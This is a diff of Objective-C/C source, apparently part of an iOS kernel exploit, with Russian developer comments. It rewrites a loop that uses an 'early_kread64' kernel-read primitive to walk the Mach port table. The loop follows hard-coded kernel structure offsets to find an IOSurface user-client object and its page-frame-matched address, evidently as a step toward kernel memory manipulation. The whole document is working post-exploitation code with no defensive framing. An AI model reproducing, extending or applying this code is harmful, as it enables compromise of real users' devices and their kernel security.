@@ -5841,46 +5841,48 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kern_return_t mkr = mach_port_names(mach_task_self(), &names, &namesCnt, &types, &typesCnt);
         kpNote(r, [NSString stringWithFormat:@"  mach_port_names: kr=0x%x, портов=%u", mkr, namesCnt]);
         if (mkr == KERN_SUCCESS) {
+            // 1.9.136: весь walk на early_kread64 — единственный примитив,
+            // который читает регион is_table/zone map каждый boot (kobj=0
+            // на 1.9.133-135 даже при валидном isTable из-за kreadbuf).
             for (uint32_t i = 0; i < namesCnt && !rangesVA; i++) {
                 uint32_t idx = names[i] >> 8;
                 uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * idx;
-                uint64_t oRaw = 0, kRaw = 0;
-                if (!kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8) || !oRaw) continue;
+                uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+                if (!oRaw) continue;
                 uint64_t portVA = kp_untag_ptr(oRaw);
                 if (!kpLooksLikeKernelPointer(portVA)) continue;
-                if (!kreadbuf(portVA + off_ipc_port_ip_kobject, &kRaw, 8) || !kRaw) continue;
+                uint64_t kRaw = early_kread64(portVA + off_ipc_port_ip_kobject);
+                if (!kRaw) continue;
                 uint64_t ucVA = kp_untag_ptr(kRaw);
                 if (!kpLooksLikeKernelPointer(ucVA)) continue;
                 nKobj++;
-                uint64_t coll = 0;
-                if (!kreadbuf(ucVA + 0xe8, &coll, 8) || !coll) continue;
+                uint64_t coll = early_kread64(ucVA + 0xe8);
+                if (!coll) continue;
                 coll = kp_untag_ptr(coll);
                 if (!kpLooksLikeKernelPointer(coll)) continue;
-                uint32_t cnt = 0;
-                if (!kreadbuf(coll + 0xd8, &cnt, 4)) continue;
+                uint32_t cnt = (uint32_t)early_kread64(coll + 0xd8);
                 if (cnt <= dstID || cnt > 0x200000) continue;
                 nColl++;
-                uint64_t arr = 0;
-                if (!kreadbuf(coll + 0xd0, &arr, 8)) continue;
+                uint64_t arr = early_kread64(coll + 0xd0);
+                if (!arr) continue;
                 arr = kp_untag_ptr(arr);
                 if (!kpLooksLikeKernelPointer(arr)) continue;
-                uint64_t cand = 0;
-                if (!kreadbuf(arr + (uint64_t)dstID * 8, &cand, 8) || !cand) continue;
+                uint64_t cand = early_kread64(arr + (uint64_t)dstID * 8);
+                if (!cand) continue;
                 cand = kp_untag_ptr(cand);
                 if (!kpLooksLikeKernelPointer(cand)) continue;
-                uint32_t cid = 0;
-                kreadbuf(cand + 0x10, &cid, 4);
+                uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
                 if (nLogged < 6) {
                     kpNote(r, [NSString stringWithFormat:@"    UC idx=%#x: cnt=%u cand=%#llx [cand+0x10]=%u", idx, cnt,
                               (unsigned long long)cand, cid]);
                     nLogged++;
                 }
                 if (cid != dstID) continue;   // раунд 21: surfaceID-поле
-                uint64_t ro = 0, rq = 0;
-                if (!kreadbuf(cand + 0x178, &ro, 8)) continue;
+                uint64_t ro = early_kread64(cand + 0x178);
+                if (!ro) continue;
                 ro = kp_untag_ptr(ro);
                 if (!kpLooksLikeKernelPointer(ro)) continue;
-                if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
+                uint64_t rq = early_kread64(ro + 0x18);
                 if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
                 surfVA = cand;
                 rangesVA = ro + 0x18;
